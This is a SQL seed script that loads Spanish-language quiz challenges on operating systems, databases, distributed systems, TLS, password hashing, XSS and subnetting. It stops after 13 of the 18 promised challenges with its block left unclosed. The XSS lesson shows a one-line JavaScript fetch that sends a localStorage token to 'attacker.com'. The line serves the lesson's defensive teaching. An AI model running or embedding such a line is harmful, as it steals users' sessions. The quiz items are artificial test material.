-- ==============================================================================
-- ⚔️ SGFC SEED: 32 - ARENA CLASIFICATORIA: MÓDULO RANGO ORO
-- ==============================================================================
-- Módulo exclusivo "Arena de Retos: Rango Oro" con 18 desafíos técnicos:
--   1. Sistemas Operativos & Concurrencia (Coffman & Deadlocks, TLB/Paginación, Mutex vs Semáforos)
--   2. Arquitectura de Sistemas Distribuidos (Teorema CAP, Idempotencia, Circuit Breaker)
--   3. Bases de Datos de Alto Rendimiento (MVCC, Niveles de Aislamiento SQL, Sharding vs Replicación)
--   4. Ciberseguridad & Criptografía (Negociación TLS, Hashing Argon2/Bcrypt, Cookies HttpOnly vs XSS)
--   5. Redes Avanzadas & Protocolos (Cálculo de Subredes CIDR /27, HTTP/2 vs HTTP/3 y QUIC)
--   6. Algoritmos y Estructuras de Datos Avanzadas (Kadane O(N), Ciclos en Grafos, Caché LRU, Token Bucket)
-- ==============================================================================

DO $ARENA_GOLD_SEED$
DECLARE
  v_gold_module_id UUID;
BEGIN

  -- 1. Limpiar registros previos de Oro si existían para actualización determinista
  DELETE FROM public.user_progress WHERE challenge_id IN (
    SELECT id FROM public.challenges WHERE module_id IN (
      SELECT id FROM public.modules WHERE title = 'Arena de Retos: Rango Oro'
    )
  );
  DELETE FROM public.challenges WHERE module_id IN (
    SELECT id FROM public.modules WHERE title = 'Arena de Retos: Rango Oro'
  );
  DELETE FROM public.modules WHERE title = 'Arena de Retos: Rango Oro';

  -- 2. Crear Módulo Oficial de Oro
  INSERT INTO public.modules (title, description, difficulty_level)
  VALUES (
    'Arena de Retos: Rango Oro',
    'Retos de élite para Rango Oro: Concurrencia y SO, Arquitecturas Distribuidas, Sharding y MVCC en Bases de Datos, Criptografía y Ciberseguridad, Protocolos de Transporte HTTP/3 y Algoritmos Avanzados.',
    3
  ) RETURNING id INTO v_gold_module_id;

  -- ============================================================================
  -- 🥇 SECCIÓN 1: SISTEMAS OPERATIVOS Y CONCURRENCIA
  -- ============================================================================

  -- ORO 1: Condiciones de Coffman y Prevención de Deadlocks (Quiz)
  INSERT INTO public.challenges (
    module_id, title, description, theory, challenge_type, test_code, xp_reward, order_index
  ) VALUES (
    v_gold_module_id,
    'Sistemas Operativos: Condiciones de Coffman y Deadlocks',
    'Analiza las 4 condiciones necesarias de Coffman para que ocurra un interbloqueo y la técnica estándar de prevención.',
    '# Interbloqueos (Deadlocks) y Condiciones de Coffman

En sistemas operativos concurrentes, un **Deadlock** ocurre cuando un conjunto de procesos o hilos se bloquea indefinidamente porque cada uno retiene un recurso y espera por otro que está retenido por otro proceso del mismo conjunto.

En 1971, Edward G. Coffman Jr. enunció las **cuatro condiciones necesarias y simultáneas** para que se manifieste un deadlock:

1. **Exclusión Mutua:** Al menos un recurso debe ser no compartible.
2. **Retención y Espera (Hold and Wait):** Un proceso retiene recursos y al mismo tiempo solicita recursos adicionales asignados a otros.
3. **No Apropiación (No Preemption):** Los recursos no pueden ser arrebatados a la fuerza; solo pueden ser liberados voluntariamente por el proceso que los retiene.
4. **Espera Circular:** Existe una cadena cerrada de procesos $\{P_0, P_1, \dots, P_n\}$ donde $P_0$ espera por un recurso de $P_1$, $P_1$ por uno de $P_2$, y $P_n$ por uno de $P_0$.

Para **prevenir** deadlocks a nivel de diseño, la técnica más adoptada en kernels y motores de base de datos es invalidar la espera circular asignando un identificador numérico único a cada recurso y forzando a todo hilo a solicitar recursos siempre en estricto orden ascendente.',
    'quiz',
    '[{"question": "¿Cuáles son las 4 condiciones de Coffman necesarias para que ocurra un deadlock y cuál es la estrategia habitual para romper una de ellas a nivel de arquitectura?", "options": ["Exclusión mutua, Retención y espera, No apropiación y Espera circular; se rompe habitualmente forzando una jerarquía estricta de adquisición de recursos", "Paginación, Segmentación, TLB miss y Swapping; se rompe duplicando la memoria RAM disponible", "Race condition, Starvation, Priority inversion y Thrashing; se rompe eliminando el planificador preemptivo", "Read uncommitted, Read committed, Repeatable read y Serializable; se rompe reduciendo el nivel de aislamiento de la BD"], "correctIndex": 0, "explanation": "Las 4 condiciones formuladas por Coffman son Exclusión Mutua, Hold and Wait, No Preemption y Circular Wait. Invalidar la espera circular imponiendo un orden numérico estricto en la adquisición de locks es la solución estándar en software de sistemas."}]',
    220,
    1
  );

  -- ORO 2: Memoria Virtual, TLB y Page Faults (Quiz)
  INSERT INTO public.challenges (
    module_id, title, description, theory, challenge_type, test_code, xp_reward, order_index
  ) VALUES (
    v_gold_module_id,
    'Sistemas Operativos: Memoria Virtual, TLB y Page Faults',
    'Comprende el ciclo de traducción de direcciones virtuales a físicas, fallos de página y el rol del TLB.',
    '# Memoria Virtual y Jerarquía de Traducción

La **Memoria Virtual** desacopla la memoria lógica del proceso de la memoria física RAM.

### Componentes Clave:
1. **MMU (Memory Management Unit):** Chip de hardware que traduce direcciones virtuales en direcciones físicas en cada instrucción.
2. **TLB (Translation Lookaside Buffer):** Caché asociativa de altísima velocidad integrada en la CPU que almacena las traducciones más recientes (Virtual Page Number $\rightarrow$ Physical Frame).
3. **Tablas de Páginas (Page Tables):** Estructura jerárquica multinivel (ej: 4 niveles en x86-64: PML4 $\rightarrow$ PDP $\rightarrow$ PD $\rightarrow$ PT) en memoria RAM.
4. **Page Fault:** Si una página solicitada tiene su bit de presencia en `0`, la MMU no puede resolver la dirección física y dispara una excepción de hardware (Page Fault, interrupción 14 en x86). El kernel interviene, busca un marco libre en RAM física, lee el bloque de almacenamiento (swap/disco) y actualiza la tabla de páginas.',
    'quiz',
    '[{"question": "Cuando la CPU ejecuta una instrucción que accede a memoria y experimenta un TLB Miss seguido de un Page Fault, ¿cuál es la secuencia precisa de eventos?", "options": ["El MMU no encuentra la traducción en la caché TLB, recorre las tablas de páginas (page walk); al constatar que la página no está en RAM física, lanza una interrupción para que el kernel la cargue desde disco", "El procesador sufre un Kernel Panic y se reinicia para evitar la corrupción de datos en el bus PCIe", "El procesador escribe directamente en la memoria caché L1 saltándose la comprobación de memoria virtual", "El sistema operativo duplica el espacio de memoria del proceso usando fork() de forma automática"], "correctIndex": 0, "explanation": "Ante un TLB Miss, el hardware realiza un page table walk. Si el bit de presencia indica que la página está en almacenamiento secundario (swap/disco), se genera una interrupción de Page Fault, cediendo el control al manejador de memoria del kernel."}]',
    220,
    2
  );

  -- ORO 3: Concurrencia - Mutex vs Semáforo Contador (Quiz)
  INSERT INTO public.challenges (
    module_id, title, description, theory, challenge_type, test_code, xp_reward, order_index
  ) VALUES (
    v_gold_module_id,
    'Concurrencia: Mutex vs Semáforos Contadores',
    'Distingue con precisión la semántica de propiedad (ownership) y señalización entre primitivas de sincronización.',
    '# Mutex vs Semáforo Contador

Aunque ambos son mecanismos de sincronización en sistemas multiproceso y multihilo, tienen propósitos arquitectónicos muy distintos:

### Mutex (Mutual Exclusion Lock):
- **Propiedad (Ownership):** Un mutex tiene concepto estricto de propietario. El hilo $T_A$ que ejecuta `lock()` es el **único** que puede invocar `unlock()`. Si otro hilo intenta liberarlo, se considera un error grave de semántica.
- **Objetivo:** Proteger una región crítica exclusiva para que solo 1 hilo opere a la vez.

### Semáforo Contador (Counting Semaphore):
- **Sin Propietario:** Mantiene un contador interno inicializado en $N$. Cualquier hilo puede realizar `wait()` (decrementa y bloquea si es $\le 0$) o `signal()` / `post()` (incrementa y despierta hilos).
- **Objetivo:** Gestionar un grupo de recursos finitos (ej: un pool de 10 conexiones a base de datos) o señalización entre productores y consumidores.',
    'quiz',
    '[{"question": "¿Cuál es la diferencia fundamental en semántica y propiedad entre un Mutex y un Semáforo Contador?", "options": ["Un Mutex tiene propiedad estricta (solo el hilo que hizo lock puede hacer unlock), mientras que un semáforo contador no tiene dueño y cualquier hilo puede señalizarlo para coordinar acceso a un cupo N de recursos", "Un Mutex solo permite hilos en Python, mientras que los semáforos son exclusivos de sistemas operativos basados en Linux", "Un semáforo contador solo permite un hilo a la vez, mientras que un Mutex permite un número infinito de hilos concurrentes", "Un Mutex nunca puede provocar deadlocks, mientras que los semáforos siempre producen inanición (starvation)"], "correctIndex": 0, "explanation": "La propiedad (ownership) es la distinción vital: el mutex solo puede ser desbloqueado por el hilo que lo adquirió. El semáforo es un mecanismo de conteo y señalización donde un hilo productor puede notificar a un hilo consumidor invocando signal()."}]',
    220,
    3
  );

  -- ============================================================================
  -- 🥇 SECCIÓN 2: ARQUITECTURAS DISTRIBUIDAS & BACKEND
  -- ============================================================================

  -- ORO 4: Teorema CAP y Particionamiento de Red (Quiz)
  INSERT INTO public.challenges (
    module_id, title, description, theory, challenge_type, test_code, xp_reward, order_index
  ) VALUES (
    v_gold_module_id,
    'Arquitectura Distribuida: Teorema CAP y Particiones',
    'Comprende el Teorema de Brewer y por qué ante fallos de red se debe elegir entre consistencia y disponibilidad.',
    '# El Teorema CAP (Brewer)

En un sistema de datos distribuido que se comunica a través de una red, el **Teorema CAP** demuestra que es imposible garantizar simultáneamente estas 3 propiedades:

1. **Consistencia (C - Linearizable Consistency):** Toda lectura recibe la escritura más reciente o un error.
2. **Disponibilidad (A - Availability):** Cada petición no errónea recibe una respuesta (sin garantía de que sea la más reciente).
3. **Tolerancia a Particiones (P - Partition Tolerance):** El sistema continúa operando a pesar de que la red pierda o demore mensajes arbitrariamente entre nodos.

### La Realidad del Trade-Off:
Dado que las redes físicas reales pueden sufrir cortes de enlace o latencias extremas (haciendo que **P** sea obligatoria), ante una partición real la arquitectura debe decidir:
- **Elegir CP:** Rechazar escrituras en particiones minoritarias para evitar inconsistencias de datos (ej: etcd, Zookeeper, bases con quórum estricto).
- **Elegir AP:** Permitir que los nodos aislados sigan respondiendo lecturas y escrituras, aceptando divergencias temporales que se resolverán después (ej: Cassandra, DynamoDB con consistencia eventual).',
    'quiz',
    '[{"question": "Ante una partición de red inevitable en un sistema distribuido (la P de CAP), ¿qué decisión arquitectónica forzosa debe tomarse?", "options": ["Debe elegirse entre CP (rechazar peticiones para garantizar que no haya datos divergentes) o AP (responder siempre pero aceptando servir o escribir datos con consistencia eventual)", "El teorema demuestra que con Kubernetes y gRPC se puede tener C, A y P al 100% de forma simultánea", "El sistema debe reiniciar todos los nodos maestros hasta que el enlace de fibra óptica vuelva a responder", "El sistema debe migrar en caliente toda la base de datos a un único archivo SQLite local"], "correctIndex": 0, "explanation": "Las particiones de red son una realidad física inevitable. Cuando la red se divide, el sistema debe elegir entre consistencia estricta (rechazando peticiones en nodos desactualizados) o alta disponibilidad (permitiendo escrituras que luego requerirán resolución de conflictos)."}]',
    220,
    4
  );

  -- ORO 5: Idempotencia y Pasarelas de Pago en APIs (Quiz)
  INSERT INTO public.challenges (
    module_id, title, description, theory, challenge_type, test_code, xp_reward, order_index
  ) VALUES (
    v_gold_module_id,
    'Arquitectura Backend: Idempotencia y Manejo de Reintentos',
    'Diseña APIs resilientes ante timeouts de red evitando cargos duplicados mediante Idempotency Keys.',
    '# Idempotencia en Servicios Web

Una operación es **idempotente** si la ejecución de múltiples peticiones idénticas produce exactamente el mismo efecto secundario en el servidor que una única ejecución:
$$f(f(x)) = f(x)$$

### Verbos HTTP y la Especificación RFC 9110:
- `GET`, `PUT`, `DELETE`: Son idempotentes por especificación.
- `POST`: **NO es idempotente**. Invocar un `POST /pagos` dos veces puede crear dos cobros en la tarjeta del cliente.

### Problema de Red Habitual:
1. El cliente envía `POST /pagos` por $100 USD.
2. El servidor procesa el cobro con éxito.
3. Se corta la conexión antes de que la respuesta HTTP 200 llegue al cliente.
4. El cliente asume fallo y reintenta la petición.

### Solución Estándar: "Idempotency-Key"
El cliente genera un identificador único (UUID v4) y lo envía en el header:
`Idempotency-Key: 7b3a62d0-14e2-4b2a-89a1-8d0cf354aa19`
El servidor almacena la clave en una caché atómica (Redis) junto con el estado del proceso. Si recibe una petición con la misma clave, no re-procesa el pago: devuelve la respuesta original almacenada.',
    'quiz',
    '[{"question": "¿Por qué POST no es idempotente en HTTP y cómo resuelven las pasarelas de pago el riesgo de cobros duplicados por reintentos de red?", "options": ["POST puede crear un nuevo recurso en cada invocación; se soluciona enviando un header Idempotency-Key (UUID) que el servidor almacena para responder con el mismo resultado sin reejecutar la transacción", "Cambiando todas las peticiones a GET, ya que los pagos nunca deben llevar un cuerpo de datos", "Deshabilitando el botón de envío en el frontend con JavaScript, lo cual es infalible ante desconexiones de red", "Aplicando un cifrado MD5 al número de tarjeta para que el servidor rechace strings repetidos"], "correctIndex": 0, "explanation": "POST no es idempotente por estándar. La utilización de encabezados de idempotencia (Idempotency Keys) permite asociar un UUID a la transacción: ante reintentos por cortes de red o timeouts, el servidor retorna el resultado previo sin duplicar cobros."}]',
    240,
    5
  );

  -- ORO 6: Patrón Circuit Breaker y Resiliencia (Quiz)
  INSERT INTO public.challenges (
    module_id, title, description, theory, challenge_type, test_code, xp_reward, order_index
  ) VALUES (
    v_gold_module_id,
    'Arquitectura Distribuida: Patrón Circuit Breaker',
    'Evita fallos en cascada en microservicios implementando la máquina de estados Closed, Open y Half-Open.',
    '# Patrón Circuit Breaker (Disyuntor de Software)

En arquitecturas distribuidas de microservicios, las llamadas remotas pueden fallar o responder con altísima latencia. Si 1000 hilos esperan una respuesta lenta de un servicio downstream caído, todo el sistema colapsa en cascada (**Cascading Failure**).

El patrón **Circuit Breaker** envuelve las llamadas remotas en una máquina de estados:

1. **Closed (Cerrado - Estado Normal):**
   - El tráfico fluye normalmente al servicio remoto.
   - Cuenta la tasa de fallos o timeouts en una ventana de tiempo.
2. **Open (Abierto - Servicio Caído):**
   - Si la tasa de fallos supera un umbral (ej: >50%), el circuito se abre.
   - Las peticiones **fallan de inmediato** (Fail-Fast) sin tocar la red, retornando un fallback o error rápido.
   - Protege al servicio downstream permitiéndole recuperarse.
3. **Half-Open (Semiabierto - Verificación de Recuperación):**
   - Transcurrido un tiempo de enfriamiento (ej: 30 segundos), permite pasar un número limitado de peticiones de prueba ("canary requests").
   - Si tienen éxito, el circuito vuelve a **Closed**. Si fallan, regresa a **Open** reiniciando el temporizador.',
    'quiz',
    '[{"question": "¿Cuál es la función del estado Half-Open en la máquina de estados del patrón Circuit Breaker?", "options": ["Permite pasar un flujo controlado de peticiones de prueba para comprobar si el servicio remoto se recuperó antes de restablecer el tráfico normal en Closed", "Significa que el microservicio funciona con la mitad de memoria RAM para reducir costos", "Permite que solo los administradores con privilegios root puedan realizar peticiones en un incidente", "Desconecta la mitad de los servidores en la nube para forzar un reinicio del balanceador de carga"], "correctIndex": 0, "explanation": "El estado Half-Open actúa como sonda de prueba: tras un periodo de enfriamiento, envía unas pocas peticiones de prueba. Si responden favorablemente, el circuito se cierra restableciendo el flujo normal; de lo contrario, se vuelve a abrir."}]',
    240,
    6
  );

  -- ============================================================================
  -- 🥇 SECCIÓN 3: BASES DE DATOS DE ALTO RENDIMIENTO
  -- ============================================================================

  -- ORO 7: Niveles de Aislamiento SQL y Lecturas Fantasma (Quiz)
  INSERT INTO public.challenges (
    module_id, title, description, theory, challenge_type, test_code, xp_reward, order_index
  ) VALUES (
    v_gold_module_id,
    'Bases de Datos: Niveles de Aislamiento ANSI SQL',
    'Conoce los fenómenos de concurrencia: Dirty Read, Non-Repeatable Read y Phantom Read en transacciones.',
    '# Niveles de Aislamiento en Transacciones SQL

El estándar ANSI/ISO SQL define 4 niveles de aislamiento para controlar cómo interactúan las transacciones concurrentes:

| Nivel de Aislamiento | Lectura Sucia (Dirty Read) | Lectura No Repetible | Lectura Fantasma (Phantom Read) |
| :--- | :---: | :---: | :---: |
| **Read Uncommitted** | Permitido | Permitido | Permitido |
| **Read Committed** | **Prevenido** | Permitido | Permitido |
| **Repeatable Read** | **Prevenido** | **Prevenido** | Permitido |
| **Serializable** | **Prevenido** | **Prevenido** | **Prevenido** |

### Definición de Anomalías:
- **Dirty Read:** Leer datos escritos por una transacción concurrente que aún NO ha hecho `COMMIT` (y que podría hacer `ROLLBACK`).
- **Non-Repeatable Read:** Si una transacción vuelve a leer la misma fila en el tiempo $t_2$, encuentra que los valores de las columnas cambiaron porque otra transacción los actualizó y confirmó.
- **Phantom Read (Lectura Fantasma):** Si una transacción ejecuta una consulta de rango (`WHERE edad > 18`) dos veces, en la segunda lectura aparecen nuevas filas insertadas y confirmadas por otra transacción.',
    'quiz',
    '[{"question": "¿Qué distingue al nivel de aislamiento Repeatable Read del nivel Serializable en el estándar ANSI SQL?", "options": ["Repeatable Read garantiza que los registros ya leídos no cambien de valor pero puede permitir que aparezcan nuevas filas en consultas de rango (Phantom Reads); Serializable previene toda anomalía garantizando aislamiento total", "Repeatable Read bloquea toda la base de datos para un solo usuario mientras que Serializable permite escrituras libres", "Serializable es el nivel más débil y permite lecturas sucias de transacciones no confirmadas", "No existe diferencia práctica; son términos comerciales utilizados indistintamente"], "correctIndex": 0, "explanation": "Repeatable Read protege contra la modificación de filas individuales leídas pero, a nivel estándar, permite que se inserten nuevas filas que cumplan el predicado de rango (Phantom Reads). Serializable elimina los fantasmas mediante bloqueos de predicado o aislamiento Snapshot serializable (SSI)."}]',
    240,
    7
  );

  -- ORO 8: Control de Concurrencia Multiversión (MVCC) (Quiz)
  INSERT INTO public.challenges (
    module_id, title, description, theory, challenge_type, test_code, xp_reward, order_index
  ) VALUES (
    v_gold_module_id,
    'Bases de Datos: Control de Concurrencia Multiversión (MVCC)',
    'Aprende cómo motores como PostgreSQL logran que los lectores no bloqueen a los escritores.',
    '# ¿Qué es MVCC (Multi-Version Concurrency Control)?

En bases de datos tradicionales basadas puramente en bloqueos de 2 fases (2PL), si un lector realiza una consulta larga sobre una tabla, bloquea a los escritores; si un escritor actualiza una fila, bloquea a todos los lectores. Esto destruye la concurrencia.

### La Filosofía de MVCC:
> **"Los lectores nunca bloquean a los escritores, y los escritores nunca bloquean a los lectores."**

### Implementación en PostgreSQL:
- Cada fila (tupla) en disco incluye encabezados ocultos: `xmin` (ID de la transacción que la creó) y `xmax` (ID de la transacción que la eliminó o actualizó).
- Cuando se ejecuta un `UPDATE`, PostgreSQL **no sobreescribe** la fila original: marca su `xmax` con el ID de la transacción actual y crea una **nueva versión física** de la tupla con un nuevo `xmin`.
- Cada transacción consulta una foto ("snapshot") inmutable basada en su timestamp lógico.
- El proceso en segundo plano **VACUUM** se encarga de limpiar periódicamente las tuplas muertas (dead tuples) que ya no son visibles para ninguna transacción activa.',
    'quiz',
    '[{"question": "¿Cuál es el beneficio fundamental de MVCC en motores de bases de datos relacionales como PostgreSQL?", "options": ["Permite que las lecturas no bloqueen las escrituras y las escrituras no bloqueen las lecturas mediante versionado de tuplas con identificadores de transacción (xmin/xmax)", "Permite almacenar bases de datos exclusivamente en la memoria caché L2 del procesador", "Elimina la necesidad de utilizar índices B-Tree y claves foráneas en el diseño relacional", "Hace que las consultas SQL se ejecuten sin requerir conexión de red con el servidor"], "correctIndex": 0, "explanation": "MVCC preserva versiones históricas de cada fila mientras haya transacciones activas observándolas. Esto permite que una consulta analítica de lectura masiva no impida que otros clientes inserten o actualicen datos concurrentemente."}]',
    240,
    8
  );

  -- ORO 9: Sharding Horizontal vs Replicación Read-Replica (Quiz)
  INSERT INTO public.challenges (
    module_id, title, description, theory, challenge_type, test_code, xp_reward, order_index
  ) VALUES (
    v_gold_module_id,
    'Bases de Datos: Sharding Horizontal vs Read Replicas',
    'Determina cuándo escalar lecturas con réplicas y cuándo particionar horizontalmente la base de datos.',
    '# Escalabilidad de Bases de Datos

Cuando una base de datos alcanza los límites de un único servidor (escalado vertical saturado), existen dos estrategias fundamentales:

### 1. Replicación Primario-Réplica (Read Replicas):
- Un nodo **Primario/Writer** recibe todas las escrituras (`INSERT`, `UPDATE`, `DELETE`).
- Múltiples nodos **Réplicas/Readers** replican el log binario (WAL) para absorber consultas de lectura (`SELECT`).
- **Límite:** Si el volumen de escrituras supera la capacidad de IOPS de CPU/disco del Primario, añadir más réplicas **no sirve de nada**, porque todas las réplicas deben reproducir el 100% de las escrituras.

### 2. Sharding (Particionamiento Horizontal):
- Divide la tabla física en fragmentos independientes (**shards**) distribuidos en servidores físicos distintos.
- Cada shard es dueño de un subconjunto de datos determinado por una **Shard Key** (ej: `hash(user_id) % N`).
- **Beneficio:** Escala tanto la capacidad de almacenamiento como el rendimiento de **escrituras y lecturas**.
- **Costo:** Operaciones que involucran múltiples shards (`JOIN` entre shards o transacciones distribuidas con 2-Phase Commit) son sumamente costosas y complejas.',
    'quiz',
    '[{"question": "Cuando una base de datos relacional satura su capacidad de escritura (Write IOPS), ¿por qué agregar Read Replicas no resuelve el problema?", "options": ["Porque todas las escrituras deben procesarse obligatoriamente en el nodo maestro y replicarse; para escalar escrituras se requiere Sharding o particionamiento horizontal", "Porque las réplicas de lectura solo admiten consultas programadas en lenguaje C++", "Porque las réplicas de lectura consumen todo el ancho de banda del datacenter impidiendo peticiones web", "Porque las bases de datos SQL solo soportan un máximo de 2 réplicas por servidor físico"], "correctIndex": 0, "explanation": "Las réplicas de lectura solo escalan la concurrencia de consultas SELECT. Al estar subordinadas al nodo maestro, no pueden procesar escrituras independientes; cada réplica debe replicar las escrituras del maestro, por lo que el cuello de botella de escritura persiste intacto."}]',
    240,
    9
  );

  -- ============================================================================
  -- 🥇 SECCIÓN 4: CIBERSEGURIDAD & CRIPTOGRAFÍA
  -- ============================================================================

  -- ORO 10: Criptografía Híbrida y Negociación TLS (Quiz)
  INSERT INTO public.challenges (
    module_id, title, description, theory, challenge_type, test_code, xp_reward, order_index
  ) VALUES (
    v_gold_module_id,
    'Criptografía: Cifrado Híbrido y Negociación TLS',
    'Comprende por qué HTTPS combina algoritmos asimétricos con cifrado simétrico en el tráfico de sesión.',
    '# Criptografía Híbrida en TLS (HTTPS)

El protocolo **TLS** (Transport Layer Security) protege miles de millones de conexiones web cotidianas. Para lograr seguridad y alto rendimiento, utiliza un modelo **híbrido**:

### 1. Fase Asimétrica (Handshake de Inicialización):
- Emplea criptografía de clave pública/privada (RSA o curvas elípticas ECDHE).
- **Función:**
  1. Autenticar la identidad del servidor mediante certificados X.509 firmados por una Autoridad Certificadora (CA).
  2. Negociar de forma segura una **clave secreta compartida de sesión** (Session Key) a través de un canal inseguro (Algoritmo Diffie-Hellman efímero).

### 2. Fase Simétrica (Transferencia de Datos):
- Una vez acordada la clave de sesión, el handshake asimétrico termina.
- Todo el tráfico posterior (páginas HTML, JSON, imágenes) se cifra con **cifrado simétrico** (ej: AES-256-GCM o ChaCha20-Poly1305).
- **Razón:** La criptografía simétrica es entre 100 y 1000 veces más rápida que la asimétrica y cuenta con aceleración directa por hardware en la CPU (instrucciones `AES-NI`).',
    'quiz',
    '[{"question": "¿Por qué el protocolo TLS no utiliza criptografía asimétrica para cifrar todo el flujo de datos de una sesión HTTPS?", "options": ["Porque el cifrado asimétrico es órdenes de magnitud más lento y pesado en CPU; solo se usa para autenticación y negociación de la clave de sesión, usando cifrado simétrico ultrarrápido para los datos", "Porque los navegadores web modernos no soportan claves criptográficas de más de 64 bits", "Porque el protocolo TCP solo permite transmitir números enteros y no texto cifrado asimétricamente", "Porque las claves privadas deben renovarse cada segundo en enlaces de alta velocidad"], "correctIndex": 0, "explanation": "El cifrado asimétrico requiere operaciones matemáticas pesadas de exponenciación modular que agotarían los recursos de cualquier servidor web. Por ello, TLS solo lo usa al inicio para acordar una clave simétrica con la que se cifrará el tráfico a máxima velocidad."}]',
    240,
    10
  );

  -- ORO 11: Almacenamiento Seguro de Contraseñas (Quiz)
  INSERT INTO public.challenges (
    module_id, title, description, theory, challenge_type, test_code, xp_reward, order_index
  ) VALUES (
    v_gold_module_id,
    'Ciberseguridad: Hashing de Contraseñas y Cost Factor',
    'Aprende por qué SHA-256 es peligroso para contraseñas y cómo funciones como Argon2id y Bcrypt previenen ataques.',
    '# Almacenamiento Profesional de Credenciales

Un error clásico es considerar que calcular `SHA256(password + salt)` es seguro para almacenar contraseñas. **No lo es.**

### El Problema de la Velocidad de SHA:
Las funciones de hash criptográfico como MD5, SHA-1 y SHA-256 fueron diseñadas para verificar integridad de archivos y bloques en milisegundos.
Una GPU moderna para minería o cracking (como una RTX 4090) puede calcular **más de 20.000 millones de hashes SHA-256 por segundo**. Con tablas Rainbow y ataques de diccionario, una contraseña filtrada se descubre en minutos.

### La Solución: KDFs Adaptativas (Key Derivation Functions)
Para contraseñas se requieren algoritmos que sean **intencionalmente lentos y costosos**:
1. **Factor de Coste en Tiempo (Iteraciones):** Obliga a la CPU a realizar miles de rondas de cálculo repetitivo.
2. **Factor de Coste en Memoria (Memory-Hardness):** Requiere asignar varios megabytes de memoria RAM por cada intento de hash. Esto inutiliza las GPUs y ASICs, ya que carecen de la memoria rápida por hilo necesaria.
3. **Estándares recomendados:** **Argon2id** (ganador del Password Hashing Competition) y **Bcrypt** / **Scrypt**.',
    'quiz',
    '[{"question": "¿Por qué es una grave vulnerabilidad utilizar SHA-256 con salt para almacenar contraseñas en vez de algoritmos como Argon2id o Bcrypt?", "options": ["Porque SHA-256 fue diseñado para ser ultrarrápido, permitiendo a un atacante con GPUs calcular miles de millones de hashes por segundo; se requieren funciones con factor de coste de tiempo y memoria", "Porque el algoritmo SHA-256 puede revertirse matemáticamente dividiendo el hash por la longitud de la clave", "Porque los hashes SHA-256 expiran automáticamente a las 24 horas desautenticando a los usuarios", "Porque SHA-256 no es compatible con bases de datos relacionales SQL"], "correctIndex": 0, "explanation": "La velocidad de cálculo de SHA-256 es su debilidad en contraseñas: permite ataques masivos por fuerza bruta. KDFs modernas como Argon2id consumen tiempo y memoria intencionalmente para hacer que probar millones de combinaciones sea económica y físicamente inviable."}]',
    240,
    11
  );

  -- ORO 12: Mitigación de XSS y Almacenamiento Seguro de Sesiones (Quiz)
  INSERT INTO public.challenges (
    module_id, title, description, theory, challenge_type, test_code, xp_reward, order_index
  ) VALUES (
    v_gold_module_id,
    'Ciberseguridad: Mitigación de XSS y Cookies HttpOnly',
    'Comprende por qué localStorage es vulnerable a robo de tokens y cómo la directiva HttpOnly protege la sesión.',
    '# XSS (Cross-Site Scripting) y Protección de Sesiones

Cuando un atacante inyecta JavaScript malicioso en una aplicación web (**XSS**), el script se ejecuta en el navegador de la víctima con los mismos privilegios del usuario.

### El Riesgo de `localStorage` y `sessionStorage`:
Si almacenas tu JWT o token de sesión en `localStorage`:
```javascript
// Un script inyectado por XSS puede hacer esto con 1 sola línea:
fetch("https://attacker.com/steal?token=" + localStorage.getItem("auth_token"));
```
El atacante roba la sesión del usuario instantáneamente.

### La Defensa en Profundidad: Cookies `HttpOnly`
Al enviar el token de sesión en una cookie HTTP con directivas de seguridad estrictas:
```http
Set-Cookie: session_id=abc123xyz; Path=/; Secure; HttpOnly; SameSite=Strict
```
- **`HttpOnly`:** Prohíbe terminantemente que el motor de JavaScript del navegador acceda a la cookie (`document.cookie` devuelve vacío o no incluye la cookie).
- **`Secure`:** Solo se transmite bajo canales cifrados HTTPS.
- **`SameSite=Strict`:** Protege contra ataques de CSRF (Cross-Site Request Forgery) al no enviar la cookie en peticiones originadas en sitios de terceros.',
    'quiz',
    '[{"question": "Si una aplicación web sufre una vulnerabilidad de XSS, ¿cuál es la mejor defensa para evitar que el atacante extraiga el token de autenticación mediante JavaScript?", "options": ["Guardar el token en una cookie configurada con la directiva HttpOnly, Secure y SameSite, impidiendo que el motor de JavaScript acceda a su contenido", "Guardar el token en localStorage o sessionStorage, ya que están cifrados por el sistema operativo", "Ofuscar el código fuente de la aplicación frontend con Webpack", "Deshabilitar las peticiones HTTP POST en todo el servidor web"], "correctIndex": 0, "explanation": "La directiva HttpOnly le ordena al navegador que ninguna API de JavaScript (como document.cookie o fetch) pueda acceder al contenido de la cookie. De esta forma, incluso si un atacante logra ejecutar código arbitrario mediante XSS, no puede leer el token de sesión."}]',
    240,
    12
  );

  -- ============================================================================
  -- 🥇 SECCIÓN 5: REDES AVANZADAS & PROTOCOLOS
  -- ============================================================================

  -- ORO 13: Cálculo de Subredes CIDR y Máscaras (Quiz)
  INSERT INTO public.challenges (
    module_id, title, description, theory, challenge_type, test_code, xp_reward, order_index
  ) VALUES (
    v_gold_module_id,
    'Redes Avanzadas: Subnetting CIDR y Cálculo de Hosts',
    'Calcula con precisión direcciones de red, broadcast y cantidad de hosts asignables en bloques CIDR.',
    '# Direccionamiento IPv4 y Notación CIDR

En redes informáticas, la notación **CIDR** (Classless Inter-Domain Routing) indica cuántos bits de los 32 de una dirección IPv4 corresponden a la **porción de red**.

### Fórmula de Hosts Útiles:
Si el prefijo es $/n$, los bits restantes para hosts son $H = 32 - n$.
$$\text{Total de Direcciones} = 2^H$$
$$\text{Hosts Útiles (Asignables)} = 2^H - 2$$
*(Se restan 2 direcciones: la primera representa la **Identificación de Red** y la última es la dirección de **Broadcast**).*

### Ejemplo con Subred `192.168.10.64/27`:
- Bits de red: $27$. Bits de host: $32 - 27 = 5$.
- Tamaño de bloque: $2^5 = 32$ direcciones.
- Máscara de subred: `255.255.255.224`.
- Dirección de Red: `192.168.10.64`.
- Rango de hosts utilizables: `192.168.10.65` hasta `192.168.10.94` ($30$ hosts).
- Dirección de Broadcast: `192.168.10.95`.',
    'quiz',
    '[{"question": "Dada la subred 192.168.10.64/27, ¿cuál es su dirección de broadcast y cuántas direcciones IP útiles pueden asignarse a dispositivos?", "options": ["Broadcast: 192.168.10.95; Hosts asignables: 30 direcciones (de la .65 a la .94)", "Broadcast: 192.168.10.127; Hosts asignables: 62 direcciones (de la .65 a la .126)", "Broadcast: 192.168.10.255; Hosts asignables: 254 direcciones", "Broadcast: 192.168.10.64; Hosts asignables: 32 direcciones"], "correctIndex": 0, "explanation": "Con un prefijo /27 quedan 5 bits para hosts (2^5 = 32 direcciones totales). El bloque va de .64 a .95. La primera (.64) es de red y la última (.95) es de broadcast, dejando 30 IPs asignables (.65 a .94)."}]',
    240,
    13
  );

